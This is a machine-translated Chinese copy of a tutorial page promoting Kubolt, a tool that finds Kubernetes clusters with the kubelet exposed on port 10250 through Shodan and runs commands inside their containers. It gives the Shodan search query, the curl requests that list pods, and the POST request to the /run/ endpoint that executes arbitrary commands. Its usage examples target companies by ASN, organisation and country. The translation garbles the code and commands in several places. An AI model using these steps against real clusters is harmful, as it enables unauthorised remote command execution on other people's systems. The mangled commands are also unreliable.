# Kubolt:用于扫描公共 Kubernetes 集群的实用程序

> 原文：<https://kalilinuxtutorials.com/kubolt/>

[![Kubolt : Utility For Scanning Public Kubernetes Clusters](img/caf8bbbd39129cd095070f3a4fc4c384.png "Kubolt : Utility For Scanning Public Kubernetes Clusters")](https://1.bp.blogspot.com/-jzbb69WUPDw/XPUetZbW5BI/AAAAAAAAAnI/D2155adTeR0jlszXPj14n7SxlU60GYyAgCEwYBhgL/s1600/github-scale.gif)

Kubolt 是一个简单的工具，用于扫描公共的未授权的 kubernetes 集群，并在容器内运行命令。有时，kubelet 端口 10250 对未经授权的访问是开放的，这使得使用来自 [kubelet](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go) 的 getrun 函数在容器内运行命令成为可能:

**// getRun 处理在容器内部运行命令的请求。
func(s * Server)get run(request * restful。请求，响应*restful。response){
params:= getExecRequestParams(request)
pod，ok:= s . host . getpodbyname(params . pod namespace，params.podName)
如果！ok {
响应。WriteError(http。状态未找到。Errorf("pod 不存在")
返回
}**

**也可阅读-[wafw 00 f:识别&指纹网络应用防火墙(WAF)产品保护网站](https://kalilinuxtutorials.com/wafw00f-2/)**

好吧，让我们问问我们的朋友肖丹

基本的查询是

> **ssl:真实端口:10250 404**

**Kubelet** 默认使用带 SSL 的端口 10250，404 是不带 URL 路径的 HTTP 响应。

Kubolt 通过 API 向 Shodan 请求 IP 地址列表，并保存它们以供其他操作使用

首先，让我们向 Kubelet 请求运行 pod 并过滤响应不包含`Unauthorized`而包含`container`的主机，这样我们就可以在其中运行命令。

**curl-k https://IP-from-shod an:10250/running pods/**

无论如何，如果您发现主机当时没有任何正在运行的 pods，请保留它，以备下次 pods 可能启动时使用

您可以列出这些请求中的所有可用窗格:

**curl-k https://IP-from-Shodan:10250/pods/
#或
curl http://IP-from-Shodan:10255/pods/**

接下来 **kubolt** 解析响应并生成一个新请求，如下所示:

**curl-XPOST-k https://IP-from-shod an:10250/run/<名称空间> / < PodName > / <容器名> -d "cmd= <命令运行> "**

您可以使用 Shodan 过滤器更准确地锁定公司，例如:

*   平均取样数（Average Sample Number 的缩写）
*   （同 organic）有机
*   国家
*   网

**安装**

**mkdir 输出
pip install-r requirements . txt**

**运行**

**python kubolt . py–query " ASN:123123 org:' ACME Corporation ' "
#或
python kubolt . py–query " org:' ACME Corporation ' country:UK "**

**庄丹**

**Kubolt** 使用 Shodan API 和[查询信用](https://help.shodan.io/the-basics/credit-types-explained)相应地，如果你运行没有查询过滤器的工具，那么你可能会解雇你所有的信用`.`

**免责声明**

作者提供的工具只能用于教育目的。作者不能对工具的误用负责。作者不对因使用该工具而造成的任何直接或间接损害负责。

[**Download**](https://github.com/averonesis/kubolt)